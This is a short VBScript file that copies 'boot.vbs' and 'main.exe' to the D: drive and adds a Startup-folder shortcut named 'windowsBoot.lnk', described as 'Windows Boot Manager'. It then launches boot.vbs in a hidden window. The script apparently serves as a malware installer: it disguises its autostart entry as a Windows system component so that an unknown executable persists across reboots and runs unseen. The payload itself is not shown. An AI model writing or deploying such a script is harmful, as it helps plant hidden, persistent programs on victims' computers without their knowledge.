'Copy to Windows

dim filesys
set filesys=CreateObject("Scripting.FileSystemObject")
filesys.CopyFile "boot.vbs", "D:\\"
filesys.CopyFile "main.exe", "D:\\"

'Creating a Shortcut in Startup Folder

Set Shell = CreateObject("Wscript.Shell")
StartupPath = Shell.SpecialFolders("Startup")
Set link = Shell.CreateShortcut(StartupPath & "\windowsBoot.lnk")
link.Arguments = "1 2 3"
link.Description = "Windows Boot Manager"
link.TargetPath = "D:\\boot.vbs"
link.save

'Start the process 

Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "D:\\boot.vbs" & Chr(34), 0
Set WinScriptHost = Nothing

